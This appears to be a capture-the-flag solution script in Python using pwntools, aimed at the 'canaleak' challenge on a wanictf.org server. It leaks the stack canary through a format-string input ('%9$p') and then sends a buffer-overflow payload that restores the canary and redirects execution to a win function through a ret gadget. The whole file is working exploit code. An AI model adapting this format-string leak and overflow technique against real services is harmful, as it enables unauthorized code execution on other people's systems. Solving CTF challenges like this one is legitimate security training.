from pwn import *
context.log_level = 'debug'

#p = process('./chall')
p = remote("canaleak-pwn.wanictf.org",9006)
p.recvuntil(b' me? : ')
p.sendline(b'%9$p')
canary = int(p.recvline(),16)
print(hex(canary))

win= 0x000000000040123d
ret = 0x000000000040101a

p.recvuntil(b' me? : ')
payload = b'a'*24 + p64(canary) + b'a'*8  + p64(ret) + p64(win)

p.sendline(payload)
p.interactive()
